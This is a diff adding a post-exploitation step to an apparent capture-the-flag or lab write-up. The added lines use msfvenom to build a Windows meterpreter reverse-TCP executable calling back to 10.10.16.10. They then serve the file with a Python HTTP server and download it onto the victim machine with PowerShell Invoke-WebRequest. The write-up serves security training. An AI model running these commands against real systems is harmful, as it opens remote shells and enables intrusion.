@@ -73,6 +73,31 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```lua
 ca03a3a501d204b062958bfa014f9e9f
 ```
+- Now for post exploitation we need Metasploit's meterpreter shell so i have used this,
+
+- Payload Creation
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f exe -o reverse.exe      
+```
+
+- Payload Delivery 
+
+```bash
+python -m http.server 8000     
+```
+
+![Pasted image 20250516162958.png](images/Pasted_image_20250516162958.png)
+
+- Payload Download in Victim Machine:
+
+```powershell
+Invoke-WebRequest -Uri "http://10.10.16.10:8000/reverse.exe" -OutFile "reverse.exe"
+```
+
+![Pasted image 20250516163016.png](images/Pasted_image_20250516163016.png)
+
+![Pasted image 20250516163545.png](images/Pasted_image_20250516163545.png)
 
 # Post Exploitation
 ## Metasploit Post Exploitation Module 
